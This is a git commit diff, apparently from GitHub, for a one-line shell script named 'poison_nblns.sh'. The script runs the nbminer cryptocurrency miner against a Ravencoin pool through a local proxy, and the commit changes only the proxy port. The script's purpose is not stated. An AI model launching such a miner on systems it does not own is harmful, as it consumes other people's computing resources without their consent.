00b7e289666f1d3f3b626d77a1a3135d42e1aca4
chadpetersen1337 <68467197+chadpetersen1337@users.noreply.github.com>
2020-12-11 08:00:20 +0200

    Update poison_nblns.sh

--- poison_nblns.sh
+++ poison_nblns.sh
@@ -1,1 +1,1 @@
-./nbminer -a kawpow -o stratum+ssl://stratum.ravenminer.com:13838 -u RSXqoGq5CKxy7eSm8pcSjpCMGenD9FY3gj.NB -log --proxy 127.0.0.1:8888
+./nbminer -a kawpow -o stratum+ssl://stratum.ravenminer.com:13838 -u RSXqoGq5CKxy7eSm8pcSjpCMGenD9FY3gj.NB -log --proxy 127.0.0.1:9999
